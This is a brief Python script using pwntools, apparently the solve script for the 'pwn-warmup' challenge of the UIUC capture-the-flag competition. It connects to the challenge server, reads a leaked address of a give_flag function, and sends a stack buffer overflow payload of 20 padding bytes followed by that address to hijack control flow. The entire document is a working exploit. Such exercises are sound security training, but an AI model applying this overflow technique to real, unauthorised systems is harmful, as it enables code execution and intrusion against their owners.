#!/usr/bin/env python3

from pwn import *

conn = remote("pwn-warmup.chal.uiuc.tf", 1337)

conn.recvuntil("&give_flag = ")
give_flag = int(conn.recvline(), 0)

payload = b"A"*20
payload += p32(give_flag)

conn.sendline(payload)

conn.stream()
